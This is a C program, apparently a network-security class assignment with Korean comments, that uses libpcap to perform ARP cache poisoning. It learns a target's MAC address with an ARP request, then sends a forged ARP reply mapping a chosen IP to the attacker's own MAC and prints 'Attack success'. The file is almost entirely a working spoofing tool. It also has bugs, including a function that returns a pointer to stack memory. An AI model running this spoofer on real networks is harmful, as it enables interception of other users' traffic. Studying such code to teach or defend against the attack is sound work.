#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h> // 상수 IPPROTO_TCP, IPPROTO_UDP 등을 사용하기 위해 선언한 헤더
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdint.h> // 자료형 intN_t, uintN_t를 사용하기 위해 선언한 헤더
#include <arpa/inet.h> // inet.ntoa() 함수를 사용하기 위해 선언한 헤더
#include <stdlib.h>


void usage() 
{
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}


const u_char* get_my_mac_address(char * interface)
{
	struct ifreq ifr;
	int sock;
	
	memset(&ifr, 0x00, sizeof(ifr));
	strcpy(ifr.ifr_name, interface);
	int fd=socket(AF_UNIX, SOCK_DGRAM, 0);
 
	if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0)
	{
		perror("socket ");
		return NULL;
	}

	if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0)
	{
		perror("ioctl ");
		return NULL;
	}
 
	const u_char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	shutdown(sock, SHUT_RD);
	return mac;
}


int send_arp_req(char * interface, char * senderIp, char * targetIp)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
		return -1;
	}
	// START : Set packet configuration
	// START : Set Ethernet header
	u_char* packet = (u_char*)calloc(60 ,sizeof(u_char));
	u_char* requestPacket = packet;

	struct ether_header *etherHeader;
	etherHeader = (ether_header *)requestPacket;
	const u_char *mac = get_my_mac_address(interface);

	for(int i = 0; i < 6; i++)
	{
		etherHeader->ether_dhost[i] = 255;
		etherHeader->ether_shost[i] = mac[i];
	}

	etherHeader->ether_type = htons(ETHERTYPE_ARP); // htons()함수는 short intger(일반적으로 2byte)데이터를 네트워크 byte order로 변경

	requestPacket += sizeof(struct ether_header);
	// END : Set Ethernet header

	// START : Set ARP header
	struct ether_arp *arpHeader;
	arpHeader = (ether_arp *)requestPacket;

	arpHeader->ea_hdr.ar_hrd = htons(0x0001);
	arpHeader->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
	arpHeader->ea_hdr.ar_hln = 6;
	arpHeader->ea_hdr.ar_pln = 4;
	arpHeader->ea_hdr.ar_op = htons(0x0001);

	for(int i = 0; i < 6; i++)
	{
		arpHeader->arp_sha[i] = mac[i]; // sender hardware address
		arpHeader->arp_tha[i] = 0; // target hardware address
	}

	struct sockaddr_in senderAddr, targetAddr;
	
	if(0 == inet_aton(senderIp, &senderAddr.sin_addr) || 0 == inet_aton(targetIp, &targetAddr.sin_addr))
	{
		printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
		printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
		return -1;
	}

	arpHeader->arp_spa[0] = (htonl(senderAddr.sin_addr.s_addr) & 0xff000000) >> 24; // sender protocol address
	arpHeader->arp_spa[1] = (htonl(senderAddr.sin_addr.s_addr) & 0x00ff0000) >> 16;
	arpHeader->arp_spa[2] = (htonl(senderAddr.sin_addr.s_addr) & 0x0000ff00) >> 8;
	arpHeader->arp_spa[3] = htonl(senderAddr.sin_addr.s_addr) & 0x000000ff;

	arpHeader->arp_tpa[0] = (htonl(targetAddr.sin_addr.s_addr) & 0xff000000) >> 24; // target protocol address
	arpHeader->arp_tpa[1] = (htonl(targetAddr.sin_addr.s_addr) & 0x00ff0000) >> 16;
	arpHeader->arp_tpa[2] = (htonl(targetAddr.sin_addr.s_addr) & 0x0000ff00) >> 8;
	arpHeader->arp_tpa[3] = htonl(targetAddr.sin_addr.s_addr);
	// END : Set ARP header
	// END : Set packet configuration

	pcap_sendpacket(handle, packet, 60);

	free(packet);
	packet = NULL;
	requestPacket = NULL;

	pcap_close(handle);
	return 0;
}


u_char* get_target_mac(char * interface, char * senderIp, char * targetIp)
{
	u_char* targetMac = (u_char*)malloc(sizeof(u_char) * 6);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
		return NULL;
	}

	while (true) // ARP reply capture
	{
		send_arp_req(interface, senderIp, targetIp);

		struct pcap_pkthdr* header;
		const u_char* packet;

		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		struct ether_header *etherHeader;
		etherHeader = (struct ether_header *)packet;

		uint16_t etherType = ntohs(etherHeader->ether_type);

		packet += sizeof(struct ether_header);

		struct ether_arp *arpHeader;
		arpHeader = (struct ether_arp *)packet;

		if(etherType == ETHERTYPE_ARP && ntohs(arpHeader->ea_hdr.ar_op) == 0x0002)
		{
			for(int i = 0; i < 6; i++)
				targetMac[i] = arpHeader->arp_sha[i];
			break;
		}
	}
	pcap_close(handle);
	return targetMac;
}

int arp_reply_attack(char* interface, char * senderIp, char * targetIp, u_char* targetMac)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
		return -1;
	}

	u_char* packet = (u_char*)calloc(60 ,sizeof(u_char));
	u_char* requestPacket = packet;

	struct ether_header *etherHeader;
	etherHeader = (ether_header *)requestPacket;
	const u_char *mac = get_my_mac_address(interface);
	// mac 에러 처리 만들자

	for(int i = 0; i < 6; i++)
	{
		etherHeader->ether_dhost[i] = targetMac[i];
		etherHeader->ether_shost[i] = mac[i];
	}	

	etherHeader->ether_type = htons(ETHERTYPE_ARP); // htons()함수는 short intger(일반적으로 2byte)데이터를 네트워크 byte order로 변경

	requestPacket += sizeof(struct ether_header);
	struct ether_arp *arpHeader = (ether_arp *)requestPacket;

	arpHeader->ea_hdr.ar_hrd = htons(0x0001);
	arpHeader->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
	arpHeader->ea_hdr.ar_hln = 6;
	arpHeader->ea_hdr.ar_pln = 4;
	arpHeader->ea_hdr.ar_op = htons(0x0002);

	for(int i = 0; i < 6; i++)
	{
		arpHeader->arp_sha[i] = mac[i]; // sender hardware address
		arpHeader->arp_tha[i] = targetMac[i]; // target hardware address
	}

	struct sockaddr_in senderAddr;
	inet_aton(senderIp, &senderAddr.sin_addr);

	arpHeader->arp_spa[0] = (htonl(senderAddr.sin_addr.s_addr) & 0xff000000) >> 24; // sender protocol address
	arpHeader->arp_spa[1] = (htonl(senderAddr.sin_addr.s_addr) & 0x00ff0000) >> 16;
	arpHeader->arp_spa[2] = (htonl(senderAddr.sin_addr.s_addr) & 0x0000ff00) >> 8;
	arpHeader->arp_spa[3] = htonl(senderAddr.sin_addr.s_addr) & 0x000000ff;

	struct sockaddr_in targetAddr;
	inet_aton(targetIp, &targetAddr.sin_addr);

	arpHeader->arp_tpa[0] = (htonl(targetAddr.sin_addr.s_addr) & 0xff000000) >> 24; // target protocol address
	arpHeader->arp_tpa[1] = (htonl(targetAddr.sin_addr.s_addr) & 0x00ff0000) >> 16;
	arpHeader->arp_tpa[2] = (htonl(targetAddr.sin_addr.s_addr) & 0x0000ff00) >> 8;
	arpHeader->arp_tpa[3] = htonl(targetAddr.sin_addr.s_addr);
	// END : Set ARP header
	// END : Set packet configuration

	pcap_sendpacket(handle, packet, 60);

	free(packet);
	packet = NULL;
	requestPacket = NULL;

	pcap_close(handle);
	return 0;
}


int main(int argc, char * argv[])
{	
	if (argc != 4)
	{
		usage();
		return -1;
	}

	u_char* targetMac = get_target_mac(argv[1], argv[2], argv[3]);
	arp_reply_attack(argv[1], argv[2], argv[3], targetMac);
	printf("Attack success\n");

	return 0;
}
